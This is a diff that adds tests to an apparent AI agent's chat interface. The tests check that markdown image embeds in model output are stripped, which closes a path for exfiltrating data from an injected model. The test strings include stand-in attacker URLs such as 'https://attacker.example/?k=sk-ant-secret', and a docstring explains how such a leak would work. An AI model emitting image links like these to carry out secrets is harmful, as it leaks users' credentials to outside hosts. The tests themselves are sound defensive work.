@@ -113,3 +113,49 @@ def test_the_two_kinds_are_told_apart(fake_st):
 
     assert text.markdown_calls == ["answer"]
     assert fake_st.code == [("tool output", "json")]
+
+
+# --- The other half of the exfiltration path ------------------------------------
+
+
+def test_an_image_embed_in_an_answer_is_defused():
+    """A sandbox with no network does not stop the browser fetching.
+
+    Streamlit renders markdown image syntax as an `<img>`, which the viewer's
+    browser loads with no click. So a model talked into writing
+    `![](https://attacker/?k=SECRET)` has a way out that the container's
+    missing network does nothing about — the request leaves the browser. A
+    security review found this while `shell.py` asserted the path was shut.
+    """
+    from mcp_agent.rendering import without_images
+
+    assert "attacker" not in without_images("![](https://attacker.example/?k=sk-ant-secret)")
+
+
+def test_the_alt_text_survives_so_the_answer_still_reads():
+    from mcp_agent.rendering import without_images
+
+    assert without_images("Here: ![the chart](x.png)") == "Here: [image: the chart]"
+
+
+def test_links_are_left_alone():
+    """They need a click. Stripping them would cost the model its citations."""
+    from mcp_agent.rendering import without_images
+
+    text = "See [the docs](https://example.com/page) for more."
+    assert without_images(text) == text
+
+
+def test_every_image_on_a_line_is_defused():
+    from mcp_agent.rendering import without_images
+
+    assert without_images("![a](1)![b](2)") == "[image: a][image: b]"
+
+
+def test_streamed_text_goes_through_the_same_filter(fake_st):
+    """The streaming path and the replay path both render model output."""
+    text, tools = Pane(), Pane()
+
+    draw(TurnEvent("text", "![](https://attacker.example/?k=leak)"), text, tools)
+
+    assert text.markdown_calls == ["[image]"]
